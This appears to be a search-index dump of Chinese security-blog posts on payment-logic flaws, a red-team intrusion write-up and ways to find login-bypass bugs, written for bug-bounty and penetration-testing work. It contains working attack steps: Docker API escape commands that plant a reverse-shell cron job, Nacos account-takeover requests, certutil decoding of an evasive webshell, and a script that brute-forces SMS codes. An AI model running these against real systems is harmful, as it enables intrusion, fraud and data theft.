在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#九利用小数点精度四舍五入"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2442 在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板… ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:0:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#"},{"categories":["学习"],"content":" 1、供应链在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板效应，一处出现短板，整个防护体系就可能瞬间崩溃。而目标单位的供应链往往是这些薄弱点的集中体现。这些供应链不仅暴露在外，而且由于复杂的关系，使得对它们的监控和管理变得更为困难。因此，攻击团队通常会选择从供应链着手，以一种迂回的方式绕过目标单位强大的防御体系，获得对目标单位的控制权限。 通过在搜索引擎上搜索\"系统名称\"目标单位 找到相关的供应商信息，通过对供应商进行攻击，获取目标单位的数据及权限。! ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:1:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#1供应链"},{"categories":["学习"],"content":" 1.1、heapdump泄露通过对供应商资产进行渗透，发现某资产admin目录下存在heapdump文件泄露 对于heapdump的利用方式这里就不太赘述，有许多文章对其原理和利用都进行了深入的研究，特定情况下还可以直接进行RCE，这里泄露了大量敏感信息，密码信息加入密码本 登录MinIO，发现大量所属目标单位的敏感信息，也存在其它单位的敏感信息 登录Nacos，大量配置文件，密码信息加入密码本![] 登录OSS，发现大量所属目标单位的敏感信息 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:2:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#11heapdump泄露"},{"categories":["学习"],"content":" 1.2、微信小程序接口未授权","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:3:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#12微信小程序接口未授权"},{"categories":["学习"],"content":" 1.2.1、微信小程序解包想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。 1.2.1.1、获取wxapkg文件在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰 iOS wxapkg 文件存放路径为： /var/mobile/Containers/Data/Application/{系统UUID}/Library/WechatPrivate/{user哈希值}/WeApp/LocalCache/release/{小程序的AppID} Android wxapkg 文件存放路径为： /data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/ Windows wxapkg 文件存放路径为： C:\\Users\\{系统用户名}\\Documents\\WeChat Files\\Applet\\{小程序的AppID}\\ 1.2.1.2、解密操作下面两个github项目都可以进行解密操作 https://github.com/superdashu/pc_wxapkg_decrypt_python https://github.com/BlackTrace/pc_wxapkg_decrypt 解密原理 成功解密 1.2.1.2、解包操作国光大佬提供的工具下载链接 https://sqlsec.lanzoub.com/i1NEP0mx694f node wuWxapkg.js 1.wxapkg 对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口 直接访问目标接口，前端页面虽然显示初始化失败 但流量包中已获取数据，近千万条目标单位敏感信息 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:3:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#121微信小程序解包"},{"categories":["学习"],"content":" 1.2.1、微信小程序解包想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。 1.2.1.1、获取wxapkg文件在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰 iOS wxapkg 文件存放路径为： /var/mobile/Containers/Data/Application/{系统UUID}/Library/WechatPrivate/{user哈希值}/WeApp/LocalCache/release/{小程序的AppID} Android wxapkg 文件存放路径为： /data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/ Windows wxapkg 文件存放路径为： C:\\Users\\{系统用户名}\\Documents\\WeChat Files\\Applet\\{小程序的AppID}\\ 1.2.1.2、解密操作下面两个github项目都可以进行解密操作 https://github.com/superdashu/pc_wxapkg_decrypt_python https://github.com/BlackTrace/pc_wxapkg_decrypt 解密原理 成功解密 1.2.1.2、解包操作国光大佬提供的工具下载链接 https://sqlsec.lanzoub.com/i1NEP0mx694f node wuWxapkg.js 1.wxapkg 对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口 直接访问目标接口，前端页面虽然显示初始化失败 但流量包中已获取数据，近千万条目标单位敏感信息 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:3:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#1211获取wxapkg文件"},{"categories":["学习"],"content":" 1.2.1、微信小程序解包想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。 1.2.1.1、获取wxapkg文件在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰 iOS wxapkg 文件存放路径为： /var/mobile/Containers/Data/Application/{系统UUID}/Library/WechatPrivate/{user哈希值}/WeApp/LocalCache/release/{小程序的AppID} Android wxapkg 文件存放路径为： /data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/ Windows wxapkg 文件存放路径为： C:\\Users\\{系统用户名}\\Documents\\WeChat Files\\Applet\\{小程序的AppID}\\ 1.2.1.2、解密操作下面两个github项目都可以进行解密操作 https://github.com/superdashu/pc_wxapkg_decrypt_python https://github.com/BlackTrace/pc_wxapkg_decrypt 解密原理 成功解密 1.2.1.2、解包操作国光大佬提供的工具下载链接 https://sqlsec.lanzoub.com/i1NEP0mx694f node wuWxapkg.js 1.wxapkg 对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口 直接访问目标接口，前端页面虽然显示初始化失败 但流量包中已获取数据，近千万条目标单位敏感信息 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:3:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#1212解密操作"},{"categories":["学习"],"content":" 1.2.1、微信小程序解包想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。 1.2.1.1、获取wxapkg文件在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰 iOS wxapkg 文件存放路径为： /var/mobile/Containers/Data/Application/{系统UUID}/Library/WechatPrivate/{user哈希值}/WeApp/LocalCache/release/{小程序的AppID} Android wxapkg 文件存放路径为： /data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/ Windows wxapkg 文件存放路径为： C:\\Users\\{系统用户名}\\Documents\\WeChat Files\\Applet\\{小程序的AppID}\\ 1.2.1.2、解密操作下面两个github项目都可以进行解密操作 https://github.com/superdashu/pc_wxapkg_decrypt_python https://github.com/BlackTrace/pc_wxapkg_decrypt 解密原理 成功解密 1.2.1.2、解包操作国光大佬提供的工具下载链接 https://sqlsec.lanzoub.com/i1NEP0mx694f node wuWxapkg.js 1.wxapkg 对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口 直接访问目标接口，前端页面虽然显示初始化失败 但流量包中已获取数据，近千万条目标单位敏感信息 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:3:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#1212解包操作"},{"categories":["学习"],"content":" 1.3、web程序越权通过上述收集到的密码，撞密码撞出一个账号，但是此账号为最低权限，无任何操作权限，点击搜索组织架构，此时无任何返回信息 抓包将parentId和orgLevel去除，再发包，即可越权看到全员组织架构 点击修改密码，然后将上述获取到的roleId添加进去，即可获取全部权限 获取到大量数据 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:4:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#13web程序越权"},{"categories":["学习"],"content":" 1.4、公众号js泄露密码，密码可撞库目标单位公众号 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:5:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#14公众号"},{"categories":["学习"],"content":" 2、云原生安全容器化部署和微服务架构为应用程序开发和部署提供了更好的灵活性、可伸缩性、可维护性和性能，受到了越来越多厂商的使用，新的应用就会引入新的攻击面，如容器逃逸、服务间攻击、API滥用等。攻击者可以利用这些新的入口点来攻击应用程序和数据。并且在云原生环境下管理用户和服务的身份验证和授权变得更加复杂。许多应用开发商在追求容器化和云原生架构的便利性和效率时，安全性常常被忽视或放在次要位置。这就直接导致了云原生环境的脆弱，容易受到各种安全威胁和攻击。 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:6:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#2云原生安全"},{"categories":["学习"],"content":" 2.1、Harbor 镜像仓库Harbor是一个开源的容器镜像仓库管理器，旨在帮助组织存储、管理和分发Docker容器镜像，但是Harbor存在一个充满争议的“漏洞”：任意用户能够直接获取public的镜像。 可以直接拉取下载镜像文件，可以利用脚本批量下载 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:7:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#21harbor-镜像仓库"},{"categories":["学习"],"content":" 2.2、疑似后门通过镜像文件获取jar包，获取配置文件等敏感信息，对jar包的class文件进行反编译，进行代码审计获取到一个类似后门的漏洞，该接口只需要使用用户名，即可登录系统后台。管理员权限配合文件上传获取服务器权限。 通过配置文件连接数据库等 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:8:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#22疑似后门"},{"categories":["学习"],"content":" 2.3、docker未授权","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:9:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#23docker未授权"},{"categories":["学习"],"content":" 2.3.1、 registry api未授权访问在 Docker Registry API 中，认证和授权通常是基于访问令牌（Access Token）或者用户名和密码的。如果未正确设置访问控制权限，即会造成未授权访问漏洞，攻击者可直接下载registry仓库的所有镜像容器。 访问/v2/_catalog接口即可查看全部仓库内容 https://github.com/Soufaker/docker_v2_catalog 利用上述工具可直接下载镜像 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:9:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#231-registry-api未授权访问"},{"categories":["学习"],"content":" 2.3.2、 Docker Remote API未授权访问为了管理容器集群，Docker允许Daemon作为后台守护进程执行通过管理接口发送的Docker命令，使用参数-H 0.0.0.0:2375启动Docker Daemon时，将开放2375端口接收来自远程Docker客户端的命令。在这种情况下，2375端口被作为非加密端口暴露出来，并且不存在任何形式的身份验证，攻击者可以直接使用Docker命令连接到Docker Daemon，并对容器进行直接操作，配合根目录挂载即可实现容器逃逸。 #查看容器 docker -H tcp://\u003ctarget\u003e:2375 ps -a #挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://\u003ctarget\u003e:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo '反弹shell命令' \u003e\u003e /mnt/var/spool/cron/crontabs/root ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:9:2","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#232-docker-remote-api未授权访问"},{"categories":["学习"],"content":" 2.4、NacosNacos是一个开源的动态服务发现、配置管理和服务管理平台，它提供了注册中心、配置中心和服务管理等功能，帮助开发人员实现微服务架构中的服务注册、配置管理以及服务发现等需求。 作为一个开源工具，漏洞还是被披露不少的， 未授权访问：/nacos/v1/auth/users?pageNo=1\u0026pageSize=1 直接查看用户 任意用户添加：POST /nacos/v1/auth/users username= \u0026 password= 任意用户密码修改：curl -X PUT ‘http://127.0.0.1:8848/nacos/v1/auth/users?accessToken\\=’ -H ‘User-Agent:Nacos-Server’ -d ‘username\\=test1\u0026newPassword\\=test2’ 弱口令：nacos/nacos 通过编排密码爆破进后台，发现大量配置文件，但敏感信息均被加密 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:10:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#24nacos"},{"categories":["学习"],"content":" 2.4.1、Jasypt加密Spring 的配置文件中会有一些敏感信息，如数据库密码，因此有时我们希望将敏感信息加密，Jasypt 就是其中比较方便的工具，Jasypt 是一个 Java 库，用于简化敏感数据（如密码、API 密钥等）的加密和解密操作。 加密的内容需要用 ENC(..) 括起来，加密用的密码通过 jasypt.encryptor.password 指定。 spring: datasource: username: your-username password: ENC(encrypted-password) 因为必须要解密，密码就需要放在配置文件里，或者放在代码中： # application.yml jasypt: encryption: password: 密码 algorithm: 加密方式 解密数据：使用解密器的 decrypt 方法对加密的数据进行解密操作。 import org.jasypt.util.text.BasicTextEncryptor; public class DecryptionExample { public static void main(String[] args) { String encryptionKey = \"yourEncryptionKey\"; // 加密密钥 BasicTextEncryptor textEncryptor = new BasicTextEncryptor(); textEncryptor.setPassword(encryptionKey); String encryptedText = \"encryptedText\"; // 加密后的数据 String decryptedText = textEncryptor.decrypt(encryptedText); System.out.println(\"Decrypted Text: \" + decryptedText); } } 但是客户端加密的安全性主要依赖于客户端代码的保护和可信任性，当密码泄露后，加密也就自然失效了，在ncaos一个文件中发现jasypt加密密码，可以直接进行解密操作 成功连接OSS 成功连接数据库 小程序token，接管小程序 达梦数据库是国产化的关系型数据库，使用下面工具可以进行连接 https://github.com/864381832/x-RdbmsSyncTool/releases/tag/v0.0.3 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:10:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#241jasypt加密"},{"categories":["学习"],"content":" 3、Nday","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:11:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#3nday"},{"categories":["学习"],"content":" 3.1、yongyouNC jsInvoke rce漏洞漏洞利用方法，通过Java反射机制创建一个javax.naming.InitialContext对象，并使用LDAP协议连接到指定的IP地址和端口，然后调用\"nc.itf.iufo.IBaseSPService\"服务中的\"saveXStreamConfig\"方法，接受对象和字符串作为参数，达到命令执行的效果。 命令执行成功，但是目标系统存在杀软，无法直接上传文件 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:12:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#31yongyounc-jsinvoke-rce漏洞"},{"categories":["学习"],"content":" 3.1.1、certutilcertutil 是 Windows 操作系统中的一个命令行工具，主要用于处理证书和加密相关的操作，利用 certutil的解密操作可以绕过杀软。 echo bash64编码后的免杀马 \u003e myfile.jsp 使用certutil进行解码 certutil -decode 木马相对路径 解码后的木马相对路径 冰蝎上线并上线CS ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:12:1","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#311certutil"},{"categories":["学习"],"content":" 3.2、若依二开shiro的洞修复了，找到一个前台信息泄露漏洞 通过获取到的用户名，使用弱口令进入后台，普通权限 再次对公告发布人员猜解密码，成功登录后台，多了系统管理权限，直接添加用户赋予最高权限 新增用户登录，发现定时任务功能，直接使用定时任务执行命令 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:13:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#32若依二开"},{"categories":["学习"],"content":" 3.3、shiro目标路径在被访问时，会先跳转到统一认证登录，导致大部分都忽视了该路径是存在shiro反序列化漏洞的 本着试一试的心态进行了shiro的扫描，默认密钥，直接获取权限 ","date":"2024-02-11","objectID":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/:14:0","series":null,"tags":["信息收集"],"title":"攻防实战外网突破","uri":"/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/#33shiro"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2553 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:0:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#"},{"categories":["学习"],"content":" 任意用户登录漏洞挖掘思路","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:1:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#任意用户登录漏洞挖掘思路"},{"categories":["学习"],"content":" 前言任意用户登录漏洞以利用漏洞利用难度低、危害高、奖金高已经成为src/众测漏洞挖掘中的香饽饽，本文将分享一下众测/src中任意用户登录漏洞的挖掘思路。 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:2:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#前言"},{"categories":["学习"],"content":" 1.手机验证码问题导致的任意用户登录","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#1手机验证码问题导致的任意用户登录"},{"categories":["学习"],"content":" 1.1 验证码爆破当登录流程使用手机验证码登录，没有图片验证码/图片验证码可重用/图片验证码简单可识别（可以使用captcha-killer-modified插件）且后端没有限制手机验证码验证错误次数时，可以尝试爆破手机验证码登录其他用户。 4位验证码的爆破老生常谈不再赘述；随着厂商们服务器性能的提高，服务器的rps的上升也使得6位验证码的爆破越来越快，可以使用如下方法爆破（！！！需留意服务器的rps以及测试厂商的注意事项，rps低的老系统或者厂商禁止批量爆破的项目谨慎使用6位验证码的爆破！！！）： 使用burpsuite的Turbo Intruder插件，编写如下脚本： import re def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=True ) for i in range(1000000): #生成六位验证码字典 number = \"{:06d}\".format(i) engine.queue(target.req, number.rstrip()) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status \u003c404: '''res = re.findall('Msg\":\"(.*?)\"',req.response)[0] if len(res)\u003e18:''' #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示 table.add(req) 成功案例如下： ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#11-验证码爆破"},{"categories":["学习"],"content":" 1.2 验证码明文返回获取手机验证码时，验证码直接在返回包里 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#12-验证码明文返回"},{"categories":["学习"],"content":" 1.3 